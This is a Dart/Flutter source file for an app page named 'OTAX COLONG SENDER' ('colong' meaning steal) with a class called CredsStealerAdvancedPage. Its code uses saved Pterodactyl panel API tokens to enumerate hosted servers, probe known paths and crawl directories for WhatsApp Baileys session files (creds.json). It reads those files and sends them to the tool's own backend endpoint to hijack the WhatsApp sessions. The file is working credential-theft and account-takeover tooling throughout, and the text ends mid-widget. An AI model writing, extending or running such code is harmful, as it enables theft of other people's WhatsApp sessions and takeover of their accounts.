import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'main.dart';
import 'base_page.dart';

class CredsStealerAdvancedPage extends StatefulWidget {
  final String username;
  final String role;

  const CredsStealerAdvancedPage({
    super.key,
    required this.username,
    required this.role,
  });

  @override
  State<CredsStealerAdvancedPage> createState() => _CredsStealerAdvancedPageState();
}

class _CredsStealerAdvancedPageState extends State<CredsStealerAdvancedPage> 
    with SingleTickerProviderStateMixin {
  final Color cyberBlue = AppColors.accent;
  final Color cyberPurple = AppColors.accent;
  final Color successGreen = AppColors.green;
  final Color warningOrange = AppColors.orange;
  final Color deepRed = AppColors.red;

  List<Map<String, dynamic>> _adpList = [];
  String? _selectedAdpKey;
  List<Map<String, dynamic>> _serversList = [];
  List<String> _selectedServerIds = [];
  List<Map<String, dynamic>> _foundCreds = [];
  Map<String, dynamic>? _selectedCreds;
  String _credsContent = '';
  
  bool _isLoading = false;
  bool _isScanning = false;
  bool _isConnecting = false;
  bool _scanAllServers = false;
  bool _autoConnect = true;
  int _scanProgress = 0;
  int _totalServersScanned = 0;
  int _totalCredsFound = 0;
  int _maxScanDepth = 7;
  int _maxConcurrentScans = 3;
  
  final List<String> _quickPaths = [
    '/creds.json',
    '/session/creds.json',
    '/sessions/creds.json',
    '/auth/creds.json',
    '/data/creds.json',
    '/bot/creds.json',
    '/baileys/creds.json',
    '/baileys-md/creds.json',
    '/home/container/creds.json',
    '/home/container/session/creds.json',
    '/home/container/baileys/creds.json',
  ];

  late AnimationController _animationController;
  late Animation<double> _fadeAnimation;

  final String _storageKey = 'otax_adp_data';

  @override
  void initState() {
    super.initState();
    _animationController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 500),
    );
    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _animationController, curve: Curves.easeInOut),
    );
    _animationController.forward();
    _loadAdpFromLocal();
  }

  @override
  void dispose() {
    _animationController.dispose();
    super.dispose();
  }

  Future<void> _loadAdpFromLocal() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final String? encryptedData = prefs.getString('${_storageKey}_${widget.username}');
      
      if (encryptedData != null) {
        final jsonData = jsonDecode(encryptedData);
        setState(() {
          _adpList = List<Map<String, dynamic>>.from(jsonData);
          if (_adpList.isNotEmpty) _selectedAdpKey = _adpList.first['alias'];
        });
      }
    } catch (e) {
      showCyberSnackBar(context, 'Error loading ADP: $e', isError: true);
    }
  }

  bool _isPtlc(String token) => token.toLowerCase().startsWith('ptlc_');
  bool _isPtla(String token) => token.toLowerCase().startsWith('ptla_');
  
  String _ensureHttps(String url) {
    if (!url.startsWith('http')) return 'https://$url';
    return url.replaceFirst('http://', 'https://');
  }

  Future<void> _fetchServers() async {
    if (_selectedAdpKey == null) {
      showCyberSnackBar(context, 'Pilih ADP terlebih dahulu!', isError: true);
      return;
    }

    setState(() {
      _isLoading = true;
      _serversList.clear();
      _selectedServerIds.clear();
      _foundCreds.clear();
    });

    try {
      final selectedAdp = _adpList.firstWhere((adp) => adp['alias'] == _selectedAdpKey);
      final domain = _ensureHttps(selectedAdp['domain']);
      final ptla = selectedAdp['ptla'];
      final ptlc = selectedAdp['ptlc'] ?? '';

      List<Map<String, dynamic>> servers = [];

      if (_isPtlc(ptlc)) {
        try {
          servers = await _listServersClient(domain, ptlc);
        } catch (e) {}
      }

      if (servers.isEmpty && _isPtla(ptla)) {
        try {
          servers = await _listServersApplication(domain, ptla);
        } catch (e) {}
      }

      setState(() {
        _serversList = servers;
        if (_scanAllServers && servers.isNotEmpty) {
          _selectedServerIds = servers.map((s) => s['id'] as String).toList();
        }
      });

      if (servers.isEmpty) {
        showCyberSnackBar(context, 'Tidak ada server ditemukan', isError: true);
      } else {
        showCyberSnackBar(context, 'Ditemukan ${servers.length} server');
      }
    } catch (e) {
      showCyberSnackBar(context, 'Gagal mengambil server: $e', isError: true);
    } finally {
      setState(() => _isLoading = false);
    }
  }

  Future<List<Map<String, dynamic>>> _listServersClient(String domain, String token) async {
    final List<Map<String, dynamic>> servers = [];
    int page = 1;

    while (true) {
      final response = await http.get(
        Uri.parse('$domain/api/client/servers?page=$page&per_page=100'),
        headers: {
          'Accept': 'application/json',
          'Authorization': 'Bearer $token',
        },
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final List<dynamic> serverList = data['data'] ?? [];

        for (final server in serverList) {
          final attrs = server['attributes'];
          servers.add({
            'id': attrs['identifier'],
            'name': attrs['name'] ?? attrs['identifier'],
            'memory': attrs['limits']?['memory'] ?? 0,
            'disk': attrs['limits']?['disk'] ?? 0,
          });
        }

        final pagination = data['meta']?['pagination'];
        if (page >= (pagination?['total_pages'] ?? 1)) break;
        page++;
      } else {
        break;
      }
    }

    return servers;
  }

  Future<List<Map<String, dynamic>>> _listServersApplication(String domain, String token) async {
    final List<Map<String, dynamic>> servers = [];
    int page = 1;

    while (true) {
      final response = await http.get(
        Uri.parse('$domain/api/application/servers?page=$page&per_page=100'),
        headers: {
          'Accept': 'application/json',
          'Authorization': 'Bearer $token',
        },
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final List<dynamic> serverList = data['data'] ?? [];

        for (final server in serverList) {
          final attrs = server['attributes'];
          final id = attrs['identifier'] ?? attrs['uuid_short'] ?? attrs['uuid'];
          servers.add({
            'id': id,
            'name': attrs['name'] ?? id,
            'memory': attrs['limits']?['memory'] ?? 0,
            'disk': attrs['limits']?['disk'] ?? 0,
          });
        }

        final pagination = data['meta']?['pagination'];
        if (page >= (pagination?['total_pages'] ?? 1)) break;
        page++;
      } else {
        break;
      }
    }

    return servers;
  }

  Future<void> _scanForCreds() async {
    if (_selectedAdpKey == null) {
      showCyberSnackBar(context, 'Pilih ADP terlebih dahulu!', isError: true);
      return;
    }

    if (!_scanAllServers && _selectedServerIds.isEmpty) {
      showCyberSnackBar(context, 'Pilih server atau aktifkan scan semua!', isError: true);
      return;
    }

    setState(() {
      _isScanning = true;
      _scanProgress = 0;
      _totalServersScanned = 0;
      _totalCredsFound = 0;
      _foundCreds.clear();
      _selectedCreds = null;
      _credsContent = '';
    });

    try {
      final selectedAdp = _adpList.firstWhere((adp) => adp['alias'] == _selectedAdpKey);
      final domain = _ensureHttps(selectedAdp['domain']);
      final ptla = selectedAdp['ptla'];
      final ptlc = selectedAdp['ptlc'] ?? '';

      final serversToScan = _scanAllServers 
          ? _serversList 
          : _serversList.where((s) => _selectedServerIds.contains(s['id'])).toList();

      if (serversToScan.isEmpty) {
        showCyberSnackBar(context, 'Tidak ada server untuk discan', isError: true);
        return;
      }

      final List<Future<void>> scanFutures = [];
      int completed = 0;

      for (int i = 0; i < serversToScan.length; i++) {
        final server = serversToScan[i];
        
        scanFutures.add(_scanSingleServer(domain, ptlc, ptla, server).then((credsList) {
          setState(() {
            _foundCreds.addAll(credsList);
            _totalCredsFound = _foundCreds.length;
            _totalServersScanned = completed + 1;
            _scanProgress = ((completed + 1) * 100 ~/ serversToScan.length);
          });
          completed++;
        }));

        if (scanFutures.length >= _maxConcurrentScans) {
          await Future.wait(scanFutures);
          scanFutures.clear();
        }
      }

      if (scanFutures.isNotEmpty) {
        await Future.wait(scanFutures);
      }

      if (_foundCreds.isEmpty) {
        showCyberSnackBar(context, 'Tidak ditemukan creds.json di semua server', isError: true);
      } else {
        showCyberSnackBar(context, 'Ditemukan $_totalCredsFound creds dari $_totalServersScanned server');
        if (_foundCreds.isNotEmpty) {
          setState(() {
            _selectedCreds = _foundCreds.first;
            _credsContent = _selectedCreds!['content'] ?? '';
          });
        }
      }
    } catch (e) {
      showCyberSnackBar(context, 'Error scanning: $e', isError: true);
    } finally {
      setState(() => _isScanning = false);
    }
  }

  Future<List<Map<String, dynamic>>> _scanSingleServer(
    String domain, String ptlc, String ptla, Map<String, dynamic> server) async {
    
    final serverId = server['id'];
    final List<Map<String, dynamic>> foundInThisServer = [];

    for (final path in _quickPaths) {
      try {
        final content = await _readFile(domain, ptlc, ptla, serverId, path);
        if (content.isNotEmpty) {
          foundInThisServer.add({
            'server_id': serverId,
            'server_name': server['name'],
            'path': path,
            'content': content,
            'timestamp': DateTime.now().toIso8601String(),
          });
        }
      } catch (e) {
        continue;
      }
    }

    if (foundInThisServer.isEmpty) {
      final deepScanResult = await _deepScan(domain, ptlc, ptla, serverId);
      foundInThisServer.addAll(deepScanResult.map((path) => ({
        'server_id': serverId,
        'server_name': server['name'],
        'path': path,
        'content': '',
        'timestamp': DateTime.now().toIso8601String(),
      })));
    }

    for (final creds in foundInThisServer.where((c) => c['content'] == '')) {
      try {
        final content = await _readFile(domain, ptlc, ptla, serverId, creds['path']);
        creds['content'] = content;
      } catch (e) {
        foundInThisServer.remove(creds);
      }
    }

    return foundInThisServer;
  }

  Future<List<String>> _deepScan(String domain, String ptlc, String ptla, String serverId) async {
    final List<String> foundPaths = [];
    final List<String> queue = ['/', '/home', '/home/container', '/container'];
    final Set<String> visited = {};
    int depth = 0;
    int maxDepth = _maxScanDepth;
    int maxDirs = 2000;
    int expanded = 0;

    while (queue.isNotEmpty && depth <= maxDepth && expanded < maxDirs) {
      final currentLevel = queue.length;
      
      for (int i = 0; i < currentLevel && expanded < maxDirs; i++) {
        final dir = queue.removeAt(0);
        if (visited.contains(dir)) continue;
        
        visited.add(dir);
        expanded++;

        try {
          final items = await _listDirectory(domain, ptlc, ptla, serverId, dir);
          
          for (final item in items) {
            final name = item['name'];
            final isDir = item['is_dir'];
            final fullPath = '${dir == '/' ? '' : dir}/$name';

            if (isDir) {
              if (_shouldSkipDir(name)) continue;
              queue.add(fullPath);
            } else {
              if (name.toLowerCase() == 'creds.json' || _isNumberJson(name)) {
                foundPaths.add(fullPath);
              }
            }
          }
        } catch (e) {
          continue;
        }
      }
      
      depth++;
    }

    return foundPaths;
  }

  bool _shouldSkipDir(String dirName) {
    final skipPatterns = [
      r'^proc$', r'^sys$', r'^dev$', r'^run$', r'^tmp$', r'^var$',
      r'^lib$', r'^usr$', r'^bin$', r'^sbin$', r'^etc$', r'^\.cache$',
      r'^\.git$', r'^node_modules$', r'^\.npm$', r'^\.yarn$',
    ];

    for (final pattern in skipPatterns) {
      if (RegExp(pattern, caseSensitive: false).hasMatch(dirName)) {
        return true;
      }
    }
    return false;
  }

  bool _isNumberJson(String fileName) {
    return RegExp(r'^\d{6,24}\.json$').hasMatch(fileName);
  }

  Future<List<Map<String, dynamic>>> _listDirectory(
    String domain, String ptlc, String ptla, String serverId, String dir) async {
    
    final encodedDir = Uri.encodeComponent(_normalizePath(dir));
    
    if (_isPtlc(ptlc)) {
      try {
        final response = await http.get(
          Uri.parse('$domain/api/client/servers/$serverId/files/list?directory=$encodedDir'),
          headers: {
            'Accept': 'application/json',
            'Authorization': 'Bearer $ptlc',
          },
        );

        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          final List<dynamic> items = data['data'] ?? [];
          
          return items.map<Map<String, dynamic>>((item) {
            final attrs = item['attributes'] ?? item;
            return {
              'name': attrs['name']?.toString() ?? '',
              'is_dir': !(attrs['is_file'] ?? false) ||
                        (attrs['type']?.toString().toLowerCase() == 'directory'),
            };
          }).toList();
        }
      } catch (e) {}
    }

    if (_isPtla(ptla)) {
      try {
        final response = await http.get(
          Uri.parse('$domain/api/application/servers/$serverId/files/list?directory=$encodedDir'),
          headers: {
            'Accept': 'application/json',
            'Authorization': 'Bearer $ptla',
          },
        );

        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          final List<dynamic> items = data['data'] ?? [];
          
          return items.map<Map<String, dynamic>>((item) {
            final attrs = item['attributes'] ?? item;
            return {
              'name': attrs['name']?.toString() ?? '',
              'is_dir': !(attrs['is_file'] ?? false) ||
                        (attrs['type']?.toString().toLowerCase() == 'directory'),
            };
          }).toList();
        }
      } catch (e) {}
    }

    return [];
  }

  Future<String> _readFile(String domain, String ptlc, String ptla, String serverId, String filePath) async {
    final encodedFile = Uri.encodeComponent(_normalizePath(filePath));
    
    if (_isPtlc(ptlc)) {
      try {
        final response = await http.get(
          Uri.parse('$domain/api/client/servers/$serverId/files/contents?file=$encodedFile'),
          headers: {
            'Accept': 'application/json',
            'Authorization': 'Bearer $ptlc',
          },
        );

        if (response.statusCode == 200) {
          return response.body;
        }
      } catch (e) {}
    }

    if (_isPtla(ptla)) {
      try {
        final response = await http.get(
          Uri.parse('$domain/api/application/servers/$serverId/files/contents?file=$encodedFile'),
          headers: {
            'Accept': 'application/json',
            'Authorization': 'Bearer $ptla',
          },
        );

        if (response.statusCode == 200) {
          return response.body;
        }
      } catch (e) {}
    }

    throw Exception('Gagal membaca file');
  }

  void _toggleServerSelection(String serverId) {
    setState(() {
      if (_selectedServerIds.contains(serverId)) {
        _selectedServerIds.remove(serverId);
      } else {
        _selectedServerIds.add(serverId);
      }
    });
  }

  void _toggleSelectAllServers(bool selectAll) {
    setState(() {
      if (selectAll) {
        _selectedServerIds = _serversList.map((s) => s['id'] as String).toList();
      } else {
        _selectedServerIds.clear();
      }
    });
  }

  Future<void> _connectSelectedCreds() async {
    if (_selectedCreds == null || _credsContent.isEmpty) {
      showCyberSnackBar(context, 'Pilih creds terlebih dahulu!', isError: true);
      return;
    }

    await _connectToOtax(_selectedCreds!);
  }

  Future<void> _connectAllCreds() async {
    if (_foundCreds.isEmpty) {
      showCyberSnackBar(context, 'Tidak ada creds yang ditemukan!', isError: true);
      return;
    }

    setState(() => _isConnecting = true);

    int successCount = 0;
    int failCount = 0;

    for (final creds in _foundCreds) {
      try {
        await _connectToOtax(creds);
        successCount++;
      } catch (e) {
        failCount++;
      }
    }

    setState(() => _isConnecting = false);
    
    showCyberSnackBar(context, '✅ $successCount berhasil, ❌ $failCount gagal dihubungkan',
        isError: failCount > 0);
  }

  Future<void> _connectToOtax(Map<String, dynamic> credsData) async {
    final content = credsData['content'];
    if (content.isEmpty) return;

    try {
      final credsJson = jsonDecode(content);
      String? number;
      
      if (credsJson['me']?['id'] != null) {
        final meId = credsJson['me']['id'].toString();
        if (meId.contains('@s.whatsapp.net')) {
          number = meId.split('@')[0];
        }
      }
      
      if (number == null && credsJson['wid'] != null) {
        final wid = credsJson['wid'].toString();
        if (wid.contains('@s.whatsapp.net')) {
          number = wid.split('@')[0];
        }
      }
      
      if (number == null) {
        final matches = RegExp(r'"(\d{10,15})@s\.whatsapp\.net"').allMatches(content);
        if (matches.isNotEmpty) {
          number = matches.first.group(1);
        }
      }

      if (number == null) {
        showCyberSnackBar(context, 'Tidak dapat menemukan nomor WhatsApp', isError: true);
        return;
      }

      final response = await http.post(
        Uri.parse('$baseUrl/api/pair-from-creds'),
        headers: {
          'Content-Type': 'application/json',
          'X-Username': widget.username,
        },
        body: jsonEncode({
          'creds': credsJson,
          'number': number,
          'owner': widget.username,
          'adp_alias': _selectedAdpKey,
          'server_id': credsData['server_id'],
          'server_name': credsData['server_name'],
          'path': credsData['path'],
        }),
      );

      if (response.statusCode == 200) {
        final result = jsonDecode(response.body);
        
        if (result['success'] == true) {
          showCyberSnackBar(context, '✅ ${credsData['server_name']} berhasil dihubungkan!');
          await _saveSessionToLocal(number, result['session_data']);
        } else {
          showCyberSnackBar(context, '❌ ${credsData['server_name']} gagal: ${result['error']}', isError: true);
        }
      }
    } catch (e) {
      showCyberSnackBar(context, 'Error connecting: $e', isError: true);
    }
  }

  Future<void> _saveSessionToLocal(String number, Map<String, dynamic> sessionData) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final sessions = prefs.getStringList('otax_sessions_${widget.username}') ?? [];
      if (!sessions.contains(number)) {
        sessions.add(number);
        await prefs.setStringList('otax_sessions_${widget.username}', sessions);
      }
      
      await prefs.setString(
        'otax_session_${widget.username}_$number',
        jsonEncode(sessionData),
      );
    } catch (e) {}
  }

  String _normalizePath(String path) {
    String p = path.replaceAll(r'\', '/').replaceAll(RegExp(r'/{2,}'), '/');
    p = p.replaceAll(RegExp(r'^/?(?:home/)?container/', caseSensitive: false), '/');
    if (!p.startsWith('/')) p = '/$p';
    if (p != '/' && p.endsWith('/')) p = p.substring(0, p.length - 1);
    return p;
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(24, 16, 24, 16),
      decoration: BoxDecoration(
        color: AppColors.surface,
        border: Border(bottom: BorderSide(color: AppColors.border)),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: AppColors.accent.withOpacity(0.12),
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(color: AppColors.accent.withOpacity(0.25)),
                ),
                child: Icon(Icons.security, color: AppColors.accent, size: 22),
              ),
              const SizedBox(width: 12),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    "OTAX COLONG SENDER",
                    style: TextStyle(
                      fontSize: 18,
                      fontWeight: FontWeight.w700,
                      fontFamily: appFont,
                      color: AppColors.textPrimary,
                      letterSpacing: 0.5,
                    ),
                  ),
                  Text(
                    "Scan semua server atau pilih server tertentu",
                    style: TextStyle(
                      color: AppColors.textMuted,
                      fontSize: 11,
                    ),
                  ),
                ],
              ),
            ],
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
              color: AppColors.surface2,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: AppColors.border),
            ),
            child: Row(
              children: [
                Icon(Icons.person, color: AppColors.textMuted, size: 14),
                const SizedBox(width: 6),
                Text(
                  widget.username,
                  style: TextStyle(
                    color: AppColors.textSec,
                    fontSize: 12,
                    fontFamily: appFont,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return CyberScrollPageV2(
      title: "COLONG SENDER",
      child: Column(
        children: [
          _buildAdpSelector(),
          const SizedBox(height: 16),
          _buildServerSelection(),
          const SizedBox(height: 16),
          _buildScanSection(),
          const SizedBox(height: 16),
          _buildResultsSection(),
          if (_credsContent.isNotEmpty) ...[
            const SizedBox(height: 16),
            _buildCredsPreview(),
          ],
        ],
      ),
    );
  }

  Widget _buildAdpSelector() {
    return GlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.cloud, color: AppColors.accent),
              const SizedBox(width: 10),
              Text(
                'PILIH ADP',
                style: TextStyle(
                  color: AppColors.textPrimary,
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: appFont,
                  letterSpacing: 0.5,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          if (_adpList.isEmpty)
            Center(
              child: Column(
                children: [
                  Icon(Icons.cloud_off, color: AppColors.textMuted, size: 40),
                  const SizedBox(height: 12),
                  Text(
                    'Belum ada ADP',
                    style: TextStyle(color: AppColors.textPrimary, fontSize: 14),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    'Simpan ADP terlebih dahulu di halaman Cpanel',
                    style: TextStyle(color: AppColors.textMuted, fontSize: 11),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            )
          else
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              decoration: BoxDecoration(
                color: AppColors.surface2,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: AppColors.border),
              ),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  value: _selectedAdpKey,
                  isExpanded: true,
                  dropdownColor: AppColors.surface,
                  icon: Icon(Icons.keyboard_arrow_down, color: AppColors.accent.withOpacity(0.7), size: 20),
                  style: TextStyle(color: AppColors.textPrimary, fontSize: 13),
                  items: _adpList.map((adp) {
                    return DropdownMenuItem<String>(
                      value: adp['alias'],
                      child: Row(
                        children: [
                          Icon(Icons.cloud_queue, color: AppColors.accent.withOpacity(0.6), size: 15),
                          const SizedBox(width: 10),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(adp['alias'], style: const TextStyle(color: AppColors.textPrimary, fontSize: 13)),
                                Text(
                                  adp['domain'],
                                  style: TextStyle(color: AppColors.textMuted, fontSize: 10),
                                  overflow: TextOverflow.ellipsis,
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    );
                  }).toList(),
                  onChanged: (value) {
                    setState(() {
                      _selectedAdpKey = value;
                      _serversList.clear();
                      _selectedServerIds.clear();
                      _foundCreds.clear();
                      _credsContent = '';
                    });
                  },
                ),
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildServerSelection() {
    return GlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.storage, color: AppColors.accent),
              const SizedBox(width: 10),
              Text(
                'PILIH SERVER',
                style: TextStyle(
                  color: AppColors.textPrimary,
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: appFont,
                  letterSpacing: 0.5,
                ),
              ),
              const Spacer(),
              if (_selectedAdpKey != null)
                GestureDetector(
                  onTap: _isLoading ? null : _fetchServers,
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                    decoration: BoxDecoration(
                      color: AppColors.accent.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: AppColors.accent.withOpacity(0.3)),
                    ),
                    child: _isLoading
                        ? const SizedBox(height: 16, width: 16,
                            child: CircularProgressIndicator(strokeWidth: 2, color: AppColors.accent))
                        : Text(
                            'REFRESH',
                            style: TextStyle(
                              color: AppColors.accent,
                              fontSize: 10,
                              fontFamily: appFont,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                  ),
                ),
            ],
          ),
          const SizedBox(height: 16),
          
          Row(
            children: [
              Transform.scale(
                scale: 0.9,
                child: Switch(
                  value: _scanAllServers,
                  activeColor: AppColors.accent,
                  activeTrackColor: AppColors.accent.withOpacity(0.3),
                  inactiveTrackColor: AppColors.textMuted,
                  onChanged: (value) {
                    setState(() {
                      _scanAllServers = value;
                      if (value) {
                        _selectedServerIds = _serversList.map((s) => s['id'] as String).toList();
                      } else {
                        _selectedServerIds.clear();
                      }
                    });
                  },
                ),
              ),
              Text(
                'SCAN SEMUA SERVER',
                style: TextStyle(
                  color: _scanAllServers ? AppColors.accent : AppColors.textSec,
                  fontWeight: FontWeight.bold,
                  fontFamily: appFont,
                  fontSize: 11,
                ),
              ),
            ],
          ),
          
          const SizedBox(height: 16),
          
          if (_serversList.isEmpty)
            Center(
              child: Column(
                children: [
                  Icon(Icons.storage_outlined, color: AppColors.textMuted, size: 40),
                  const SizedBox(height: 12),
                  Text(
                    'Belum ada server',
                    style: TextStyle(color: AppColors.textPrimary, fontSize: 14),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    'Klik REFRESH untuk mengambil daftar server',
                    style: TextStyle(color: AppColors.textMuted, fontSize: 11),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            )
          else if (!_scanAllServers)
            Column(
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Text(
                      'Pilih server manual:',
                      style: TextStyle(color: AppColors.textSec, fontSize: 13),
                    ),
                    Row(
                      children: [
                        GestureDetector(
                          onTap: () => _toggleSelectAllServers(true),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                            decoration: BoxDecoration(
                              color: AppColors.accent.withOpacity(0.15),
                              borderRadius: BorderRadius.circular(6),
                              border: Border.all(color: AppColors.accent.withOpacity(0.3)),
                            ),
                            child: Text(
                              'PILIH SEMUA',
                              style: TextStyle(
                                color: AppColors.accent,
                                fontSize: 9,
                                fontFamily: appFont,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                        ),
                        const SizedBox(width: 8),
                        GestureDetector(
                          onTap: () => _toggleSelectAllServers(false),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                            decoration: BoxDecoration(
                              color: AppColors.red.withOpacity(0.15),
                              borderRadius: BorderRadius.circular(6),
                              border: Border.all(color: AppColors.red.withOpacity(0.3)),
                            ),
                            child: Text(
                              'BATAL SEMUA',
                              style: TextStyle(
                                color: AppColors.red,
                                fontSize: 9,
                                fontFamily: appFont,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                Container(
                  height: 200,
                  decoration: BoxDecoration(
                    color: AppColors.bg.withOpacity(0.5),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: AppColors.border),
                  ),
                  child: ListView.builder(
                    padding: const EdgeInsets.all(8),
                    itemCount: _serversList.length,
                    itemBuilder: (context, index) {
                      final server = _serversList[index];
                      final isSelected = _selectedServerIds.contains(server['id']);
                      
                      return Container(
                        margin: const EdgeInsets.only(bottom: 6),
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                        decoration: BoxDecoration(
                          color: isSelected ? AppColors.accent.withOpacity(0.1) : AppColors.surface2.withOpacity(0.3),
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(
                            color: isSelected ? AppColors.accent.withOpacity(0.5) : AppColors.border,
                            width: isSelected ? 1.5 : 1,
                          ),
                        ),
                        child: ListTile(
                          dense: true,
                          leading: Icon(
                            isSelected ? Icons.check_circle : Icons.radio_button_unchecked,
                            color: isSelected ? AppColors.accent : AppColors.textMuted,
                            size: 18,
                          ),
                          title: Text(
                            server['name'],
                            style: TextStyle(
                              color: isSelected ? AppColors.textPrimary : AppColors.textSec,
                              fontWeight: FontWeight.w500,
                              fontSize: 13,
                            ),
                          ),
                          subtitle: Text(
                            'ID: ${server['id']} · RAM: ${server['memory']}MB',
                            style: TextStyle(color: AppColors.textMuted, fontSize: 10),
                          ),
                          onTap: () => _toggleServerSelection(server['id'] as String),
                        ),
                      );
                    },
                  ),
                ),
              ],
            )
          else
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: AppColors.accent.withOpacity(0.08),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: AppColors.accent.withOpacity(0.25)),
              ),
              child: Row(
                children: [
                  Icon(Icons.all_inclusive, color: AppColors.accent.withOpacity(0.7), size: 20),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'SCAN SEMUA SERVER AKTIF',
                          style: TextStyle(
                            color: AppColors.accent,
                            fontWeight: FontWeight.w600,
                            fontSize: 12,
                            fontFamily: appFont,
                          ),
                        ),
                        Text(
                          '${_serversList.length} server akan discan otomatis',
                          style: TextStyle(color: AppColors.textMuted, fontSize: 11),
                        ),
                      ],
                    ),
                  ),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                    decoration: BoxDecoration(
                      color: AppColors.accent.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(10),
                    ),
                    child: Text(
                      '${_serversList.length}',
                      style: TextStyle(color: AppColors.accent, fontSize: 12, fontWeight: FontWeight.bold),
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildScanSection() {
    return GlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.search, color: AppColors.accent),
              const SizedBox(width: 10),
              Text(
                'SCAN CREDS.JSON',
                style: TextStyle(
                  color: AppColors.textPrimary,
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: appFont,
                  letterSpacing: 0.5,
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          
          if (_isScanning)
            Column(
              children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(4),
                  child: LinearProgressIndicator(
                    value: _scanProgress / 100,
                    backgroundColor: AppColors.bg,
                    color: AppColors.accent,
                    minHeight: 4,
                  ),
                ),
                const SizedBox(height: 12),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Text(
                      'Memindai... $_scanProgress%',
                      style: TextStyle(color: AppColors.textMuted, fontSize: 11),
                    ),
                    Text(
                      '$_totalServersScanned/${_scanAllServers ? _serversList.length : _selectedServerIds.length} server',
                      style: TextStyle(color: AppColors.accent, fontSize: 11),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Text(
                  'Creds ditemukan: $_totalCredsFound',
                  style: TextStyle(color: AppColors.green, fontSize: 11),
                ),
              ],
            )
          else
            CyberButton(
              label: _scanAllServers ? 'SCAN SEMUA SERVER' : 'SCAN SERVER TERPILIH',
              icon: Icons.search_rounded,
              onTap: () {
                if (_scanAllServers && _serversList.isEmpty) {
                  showCyberSnackBar(context, 'Ambil server terlebih dahulu!', isError: true);
                  return;
                }
                if (!_scanAllServers && _selectedServerIds.isEmpty) {
                  showCyberSnackBar(context, 'Pilih minimal 1 server!', isError: true);
                  return;
                }
                _scanForCreds();
              },
              isLoading: _isLoading,
              width: double.infinity,
            ),
        ],
      ),
    );
  }

  Widget _buildResultsSection() {
    if (_foundCreds.isEmpty && !_isScanning) {
      return GlassCard(
        child: Center(
          child: Column(
            children: [
              Icon(Icons.find_in_page_outlined, color: AppColors.textMuted, size: 48),
              const SizedBox(height: 12),
              Text(
                'Belum ada hasil scan',
                style: TextStyle(color: AppColors.textPrimary, fontSize: 16, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 4),
              Text(
                'Mulai scan untuk mencari creds.json',
                style: TextStyle(color: AppColors.textMuted, fontSize: 13),
                textAlign: TextAlign.center,
              ),
            ],
          ),
        ),
      );
    }

    return GlassCard(
      child: Column(
